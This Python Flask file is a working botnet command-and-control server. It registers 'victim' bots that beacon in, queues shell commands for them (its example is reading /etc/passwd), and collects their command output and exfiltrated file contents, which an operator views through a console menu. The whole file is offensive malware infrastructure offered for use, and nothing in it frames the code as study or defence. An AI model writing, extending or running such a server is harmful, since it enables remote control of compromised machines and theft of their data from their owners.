from flask import Flask, request, jsonify
import time
import collections
import threading


app = Flask(__name__)

victim_counter = 0
victims = {}
commands_queue = collections.defaultdict(collections.deque)
command_outputs = collections.defaultdict(list)
received_files = collections.defaultdict(list)



@app.route('/beacon', methods=['POST'])
def handle_beacon():

    # Receives beacon signals from victim bots
    # Updates their last seen timestamp and status
    

    global victim_counter
    data = request.form

    status = data.get('status', 'online')

    victim_counter += 1
    victim_id = victim_counter

    victims[victim_id] = {
        'last_seen': time.time(),
        'status': status
    }
    print(f"[*] Received beacon from Victim: {str(victim_id)}, Status: {status}")
    return str(victim_id), 200

@app.route('/get-command', methods=['GET'])
def get_command_for_victim():
    
    # Provides a command to a victim bot if one is queued
    # Commands are popped from the queue after retrieval
    
    victim_id = request.args.get('id')
    if victim_id and commands_queue[victim_id]:
        
        command = commands_queue[victim_id].popleft()
        print(f"[*] Sending command '{command}' to Victim ID: {victim_id}")
        return command, 200
    return "", 200 

@app.route('/report', methods=['POST'])
def handle_report():
    
    # Receives general command execution output from victim bots
    # Stores the output associated with the victim ID
    
    data = request.form 
    victim_id = data.get('id')
    output = data.get('output')

    if victim_id and output is not None:
        command_outputs[victim_id].append({
            'output': output,
            'timestamp': time.time()
        })
        print(f"[*] Received general report from Victim ID: {victim_id}")
        print(f"    Output: \n{output[:200]}...")
        return jsonify({"status": "success", "message": "Report received"}), 200
    return jsonify({"status": "error", "message": "Missing victim ID or output"}), 400

@app.route('/file-report', methods=['POST'])
def handle_file_report():
    
    # Receives file content from victim bots
    
    data = request.form 
    victim_id = data.get('id')
    filename = data.get('filename')
    content = data.get('content')

    if victim_id and filename and content is not None:
        received_files[victim_id].append({
            'filename': filename,
            'content': content,
            'timestamp': time.time()
        })
        print(f"[+] Received file '{filename}' from Victim ID: {victim_id}")
        print(f"    Content (first 200 chars): \n{content[:200]}...") # Print first 200 chars
        return jsonify({"status": "success", "message": "File content received"}), 200
    return jsonify({"status": "error", "message": "Missing victim ID, filename, or content"}), 400


def operator_interface():
    
    # A simple console interface for the operator to issue commands and view data
    
    while True:
        print("\n--- C&C Operator Console ---")
        print("1. View Victims")
        print("2. Issue Command to Victim")
        print("3. View General Command Outputs")
        print("4. View Received Files")
        print("5. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            print("\n--- Victims ---")
            if not victims:
                print("No victims connected.")
            else:
                for vid, data in victims.items():
                    status = "Online" if (time.time() - data['last_seen'] < 30) else "Offline"
                    print(f"ID: {vid}, Status: {status}, Last Seen: {time.ctime(data['last_seen'])}")
        elif choice == '2':
            victim_id = input("Enter Victim ID to command: ")
            command = input("Enter command (e.g., 'read /etc/passwd', 'ls -la'): ")
            if victim_id and command:
                commands_queue[victim_id].append(command)
                print(f"Command '{command}' queued for victim {victim_id}")
            else:
                print("Invalid Victim ID or command.")
        elif choice == '3':
            print("\n--- General Command Outputs ---")
            if not command_outputs:
                print("No general command outputs yet.")
            else:
                for vid, outputs in command_outputs.items():
                    print(f"\n--- Outputs for Victim ID: {vid} ---")
                    for output_entry in outputs:
                        print(f"Time: {time.ctime(output_entry['timestamp'])}")
                        print(f"Output:\n{output_entry['output']}")
        elif choice == '4':
            print("\n--- Received Files ---")
            if not received_files:
                print("No files received yet.")
            else:
                for vid, files in received_files.items():
                    print(f"\n--- Files from Victim ID: {vid} ---")
                    for file_entry in files:
                        print(f"Filename: {file_entry['filename']}")
                        print(f"Time: {time.ctime(file_entry['timestamp'])}")
                        print(f"Content:\n{file_entry['content']}")
        elif choice == '5':
            print("Exiting operator console.")
            break
        else:
            print("Invalid choice. Please try again.")


def cleanup_old_victims():
    # Removes victims that haven't beaconed in a long time
    while True:
        current_time = time.time()
        victims_to_remove = [
            vid for vid, v_data in victims.items()
            if current_time - v_data['last_seen'] > 300 # 5 minutes inactivity
        ]
        for vid in victims_to_remove:
            print(f"[-] Removing inactive victim: {vid}")
            victims.pop(vid, None)
            commands_queue.pop(vid, None)
            command_outputs.pop(vid, None)
            received_files.pop(vid, None) 
        time.sleep(60)


cleanup_thread = threading.Thread(target=cleanup_old_victims, daemon=True)
cleanup_thread.start()


operator_thread = threading.Thread(target=operator_interface, daemon=True)
operator_thread.start()

# --- Main execution block ---
if __name__ == '__main__':
    print("\n" + "="*50)
    print(" C&C Server is starting... ")
    print(" Access the operator console in this terminal.")
    print(" Listening for victim beacons and reports on port 8080.")
    print("="*50 + "\n")
    
    app.run(host='0.0.0.0', port=8080, debug=False)
